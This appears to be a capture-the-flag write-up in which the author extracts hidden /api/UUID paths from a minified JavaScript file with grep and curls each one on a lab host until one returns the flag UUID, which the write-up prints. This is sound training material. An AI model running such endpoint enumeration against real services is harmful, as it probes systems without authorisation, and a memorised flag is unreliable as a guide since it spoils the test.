# Hidden Pathways

## Introduction
```
Embark on a web security adventure, filled with mysterious Javascript and hidden API routes.
```

## Goal
```
Reveal the secret paths and access the concealed API endpoints to get the key information.
```

## Task
```
- Launch the vulnerable service from RESOURCES
- Connect to the service on port 3000
- Download the provided app.min.js file
- Investigate the engimatic web application
- Locate the key information from hidden API
```

## Flag Format
`UUID`

## Writeup

Connecting to the provided web service we receive the file `app.min.js`. <br/>
Taking a look at the contents of the file we have a lot of output. <br/>
![Untitled(8)](https://github.com/Aryt3/writeups/assets/110562298/a6ddbe75-1ee4-4c0f-86ac-451d3302d7d7)

One thing I noticed is that there seem to be some directories we can visit called `/api/[UUID]`. <br/>
Knowing this I used a grep command to cut out all the paths. <br/>
```sh
kali@kali grep -oP '/api/\K[0-9a-f-]+' app.min.js | sed 's/^/\/api\//' > paths
```

Checking paths file: <br/>
```sh
kali@kali head -n 25 paths

/api/a8ef4c9a-d6f4-42be-b105-dadae3d1f324
/api/42501800-809c-438f-9b5d-2c6955c9f71f
/api/fe07bfc7-b1c9-4de0-9552-c9392d696021
/api/c6c06797-c16f-46de-9ded-e01f10291a01
/api/f535f322-31f4-4978-870c-e73a2fbb86f2
/api/57168b84-7805-4155-8ce7-d160e3ed31a9
/api/d0f6a23c-4b8e-4142-b5a0-e1dfa384ade0
/api/31cb6500-3220-4003-9f92-9057d78ded27
/api/83a17bcf-5043-4c6a-9ed3-c6475b1abbd8
/api/6fcee366-8440-41f8-be56-fc0d2b3844ec
/api/7b8de6e0-0e92-4241-814e-041025d9cbdd
/api/651d6a3a-59cd-4a7a-9de8-8547a42c4ea8
/api/f35d4cc0-3023-4769-9a0e-bb74a428abc0
/api/b056c028-1387-47aa-8daf-6bacfeea84ed
/api/2caf6cfe-3d36-4baa-86d3-a5acaad92fe2
/api/a5e5680f-35b2-44d0-99b6-7cbd1c942bd3
/api/07aadff4-b7b9-4758-abc5-8bade2b7b356
/api/333f6416-cc00-42cd-aa57-f7653c1c6f4a
/api/17019df7-4395-4c1c-8157-d81f8eec4835
/api/6a00d5f1-cd5a-4d1b-b03e-5ff590384362
/api/64f5ea5b-ec7f-44fc-8196-d5f634d2a801
/api/1588a773-0265-4c73-9331-0fec500f5a40
/api/fb75e099-7b27-4ecf-baa4-f26dc1d36ad5
/api/9e0b58fd-39f8-479e-9c29-03ff9a927e3c
/api/d83d926c-8883-4579-961a-5243cf86429f
```

Having the paths of all the directories I made a small script to check them all out. <br/>
```sh
#!/bin/bash

while read -r line; do
    url="https://a1843d34-4e97-484e-870d-6f857eefd4ef.idocker.vuln.land$line"
    response=$(curl -s "$url")  
    printf "%s\n" "$response" 
done < "paths"
```

Executing the script: <br/>
```sh
kali@kali chmod +x script.sh
kali@kali ./script.sh >> output.txt
```

Now we can simply open another terminal and watch the output file. <br/>
```sh
kali@kali tail -f output.txt
-------------------------------
Key information: 24767ab4-36d6-49ba-bb67-39155e272301
```

After some time we got the `Key information` which is just the UUID we need to finish the challenge. 



